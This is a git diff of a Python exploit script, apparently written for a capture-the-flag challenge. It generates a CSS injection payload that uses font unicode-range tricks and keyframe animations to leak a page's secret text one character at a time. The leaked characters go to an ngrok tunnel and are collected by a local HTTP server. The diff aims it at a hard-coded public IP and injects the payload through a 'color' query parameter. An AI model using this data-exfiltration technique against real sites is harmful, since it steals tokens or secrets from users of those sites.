@@ -13,9 +13,15 @@ import os
 from pyngrok import ngrok
 import logging
 from yaml import FlowMappingStartToken
+import sys
 
 logging.disable(logging.INFO)
 FLAG = ''
+FONT = 'Liberation Mono'
+TARGET_URL = 'http://3.110.153.60'
+#TARGET_URL = 'http://127.0.0.1:8000'
+PORT = int(sys.argv[1])
+
 class S(BaseHTTPRequestHandler):
     def _set_response(self):
         self.send_response(200)
@@ -32,16 +38,13 @@ class S(BaseHTTPRequestHandler):
         if ch not in FLAG:
             FLAG=FLAG+ch
             print(FLAG)
-            if len(FLAG)==8:
+            if len(FLAG)==10:
                 os._exit(1)
         self._set_response()
         self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
 
     def log_message(self, format, *args):
         return
-
-FONT = 'Liberation Mono'
-TARGET_URL = 'http://127.0.0.1:8000'
 
 def create_family(family,range,size):
     font_face = "@font-face{{font-family:{family};size-adjust:{size};src:local('"+FONT+"');unicode-range:{uni_range};font-style:monospace;}}"
@@ -96,6 +99,39 @@ def create_animation(n,w,families,url):
     animation+=inner.format(frames_inner=frames_inner,num=num)
     return num+1,animation
 
+def create_animation2(n,w,families,url):
+    animation = ''
+    outer = "@keyframes loop{num} {{\n {x}% {{ width: {w}px; }} \n}}"
+    for i in range(0,n+2):
+        animation+=outer.format(num=i,x=i,w=w*(i+2))+'\n'
+
+    inner = "@keyframes trychar{num} {{\n {frames_inner} \n}}"
+    frame_inner = "{x}% {{ {content} }}"
+    frames_inner = ''
+    reset_f = "font-family: rest;"
+    set_f = "font-family: {family}, rest; --leak: url({url}?{letter});"
+
+    i = 0
+    num = 0
+    for k,v in families.items():
+        content = ''
+        content = reset_f
+        frames_inner += frame_inner.format(x=i,content=content)+'\n'
+        i+=1
+        content = set_f.format(family=v,letter=k,url=url)
+        frames_inner += frame_inner.format(x=i,content=content)+'\n'
+        i+=1
+        if(i==100):
+            content = reset_f
+            frames_inner += frame_inner.format(x=i,content=content)+'\n'
+            animation+=inner.format(frames_inner=frames_inner,num=num) + '\n'
+            frames_inner = ''
+            i=0
+            num+=1
+    
+    animation+=inner.format(frames_inner=frames_inner,num=num)
+    return num+1,animation
+
 def create_leak_style(selector,h,num,n):
     scrollbar = "{selector}::-webkit-scrollbar {{ background: blue; }}\n{selector}::-webkit-scrollbar:vertical {{ background: var(--leak); }}"
     leak = "{selector}::first-line{{ font-size: 30px; }}"
@@ -115,12 +151,29 @@ def create_leak_style(selector,h,num,n):
     leak = scrollbar.format(selector=selector)+'\n'+leak.format(selector=selector)+'\n'+main.format(selector=selector,h=h,animation=animation)
     return leak
 
+def create_leak_style2(selector,h,num,n):
+    scrollbar = "{selector}::-webkit-scrollbar {{ background: blue; }}\n{selector}::-webkit-scrollbar:vertical {{ background: var(--leak); }}"
+    leak = "{selector}::first-line{{ font-size: 30px; }}"
+    main = "{selector} {{ overflow-y: auto; overflow-x: hidden; font-size: 0px; height: {h}px; width: 0px; {animation} font-family: rest; word-break: break-all; }}"
+    animation = 'animation: '
+    n_og = n
+    n = 5
+    for j in range(0,n_og+2):
+        if animation != 'animation: ':
+            animation+=','
+        animation+='loop{j} step-end {n}s {n2}s'.format(j=j,n=n,n2=n*j)
+        for i in range(0,num):
+            animation+=', trychar{i} step-end 2s {n2}s 1'.format(i=i,n=n,n2=n*j+i*(n//2)+0.5)
+    animation+=';'
+    leak = scrollbar.format(selector=selector)+'\n'+leak.format(selector=selector)+'\n'+main.format(selector=selector,h=h,animation=animation)
+    return leak
+
 def create_stylesheet(n,selector,url):
     stylesheet = ""
     families = {}
     font = ImageFont.truetype('/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf',size=30)
     w,h = font.getsize('A')
-    for i in string.ascii_lowercase + string.digits:
+    for i in "}{_~"+string.ascii_lowercase + string.digits + string.ascii_uppercase:
         family, style = create_family(family=None,range=i,size='200%')
         stylesheet+=style+'\n'
         families[i] = family
@@ -128,17 +181,17 @@ def create_stylesheet(n,selector,url):
     stylesheet+=style+'\n'
     families[i] = family
 
-    num,animation = create_animation(n,w,families,url)
+    num,animation = create_animation2(n,w,families,url)
 
     stylesheet+='\n'+animation
-    leak = create_leak_style(selector,h+h//2,num,n)
+    leak = create_leak_style2(selector,h+h//2,num,n)
     stylesheet+='\n'+leak+'\n'
     return stylesheet
 
 def send_stylesheet():
-    http_tunnel = ngrok.connect(8888)
-    s=create_stylesheet(8,'div',http_tunnel.public_url)
-    #open('test.html','w').write(s)
+    http_tunnel = ngrok.connect(PORT)
+    s=create_stylesheet(10,'div',http_tunnel.public_url)
+    open('test.html','w').write(f"<style>{s}</style><div>fv{{03Ya}}</div>")
     color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
     #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
     color = quote_plus(f"?color={color}")
@@ -148,7 +201,7 @@ def send_stylesheet():
 def receive_flag():
     server_class=HTTPServer
     handler_class=S
-    port=8888
+    port=PORT
     logging.basicConfig(level=logging.INFO)
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
